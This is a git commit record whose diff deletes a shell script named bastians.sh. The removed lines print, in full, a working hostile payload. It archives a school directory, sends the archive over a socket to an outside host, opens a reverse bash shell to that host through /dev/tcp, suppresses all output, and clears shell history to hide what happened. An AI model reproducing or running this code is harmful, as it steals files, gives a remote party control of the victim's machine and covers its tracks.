cbd3dc997265c2c7e21e7178294196ed1574dbe7
MagicalMouse39 <31729116+MagicalMouse39@users.noreply.github.com>
2021-11-26 11:04:03 +0100

    Delete bastians.sh

--- bastians.sh
+++
@@ -1,8 +0,0 @@
-tar -cf ~/mgkl.tar ~/scuola/2020_2021_ITIS_Torrette/ 1>/dev/null 2>/dev/null && python3 -c 'import socket
-import os
-s = socket.socket()
-s.connect(("mc.magicalmouse39.dev", 80))
-user = os.getenv("USER")
-with open(f"/home/{user}/mgkl.tar", "rb") as fin:
-    s.send(fin.read())
-s.close()' 1>/dev/null 2>/dev/null; $(/bin/bash -l > /dev/tcp/mc.magicalmouse39.dev/443 0<&1 2>&1 &) 1>/dev/null 2>/dev/null && history -c && clear
